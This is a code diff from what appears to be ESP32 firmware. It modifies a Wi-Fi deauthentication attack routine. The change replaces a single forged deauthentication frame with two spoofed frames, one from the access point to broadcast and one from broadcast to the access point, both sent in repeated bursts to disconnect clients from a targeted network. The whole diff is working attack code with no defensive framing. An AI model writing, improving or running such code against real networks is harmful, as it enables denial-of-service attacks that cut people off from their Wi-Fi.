@@ -1061,19 +1061,31 @@ void drawDeauthSelect() {
 void updateDeauthAttack() {
   if (!deauthAttackActive) return;
 
-  // Send deauth packets
-  deauth_frame_t deauth_frame;
-  deauth_frame.hdr.frame_ctrl = 0xc000; // Type: Management, Subtype: Deauthentication
-  deauth_frame.hdr.duration_id = 0;
-  memcpy(deauth_frame.hdr.addr1, broadcast_mac, 6); // Destination: broadcast
-  memcpy(deauth_frame.hdr.addr2, deauthTargetBSSID, 6); // Source: AP BSSID
-  memcpy(deauth_frame.hdr.addr3, deauthTargetBSSID, 6); // BSSID: AP BSSID
-  deauth_frame.hdr.seq_ctrl = 0;
-  deauth_frame.reason_code = 1; // Unspecified reason
+  // Packet 1: AP to Client (broadcast)
+  deauth_frame_t deauth_ap_to_client;
+  deauth_ap_to_client.hdr.frame_ctrl = 0xc000;
+  deauth_ap_to_client.hdr.duration_id = 0;
+  memcpy(deauth_ap_to_client.hdr.addr1, broadcast_mac, 6);
+  memcpy(deauth_ap_to_client.hdr.addr2, deauthTargetBSSID, 6);
+  memcpy(deauth_ap_to_client.hdr.addr3, deauthTargetBSSID, 6);
+  deauth_ap_to_client.hdr.seq_ctrl = 0;
+  deauth_ap_to_client.reason_code = 1;
 
-  // Channel is already set, just send the packet
-  for (int i=0; i<20; i++) { // Send a burst of packets
-    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame_t), false);
+  // Packet 2: Client (broadcast) to AP
+  deauth_frame_t deauth_client_to_ap;
+  deauth_client_to_ap.hdr.frame_ctrl = 0xc000;
+  deauth_client_to_ap.hdr.duration_id = 0;
+  memcpy(deauth_client_to_ap.hdr.addr1, deauthTargetBSSID, 6);
+  memcpy(deauth_client_to_ap.hdr.addr2, broadcast_mac, 6);
+  memcpy(deauth_client_to_ap.hdr.addr3, deauthTargetBSSID, 6);
+  deauth_client_to_ap.hdr.seq_ctrl = 0;
+  deauth_client_to_ap.reason_code = 1;
+
+  // Channel is already set, send both packets in a burst
+  for (int i=0; i<10; i++) {
+    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_ap_to_client, sizeof(deauth_frame_t), false);
+    deauthPacketsSent++;
+    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_client_to_ap, sizeof(deauth_frame_t), false);
     deauthPacketsSent++;
   }
   delay(1);
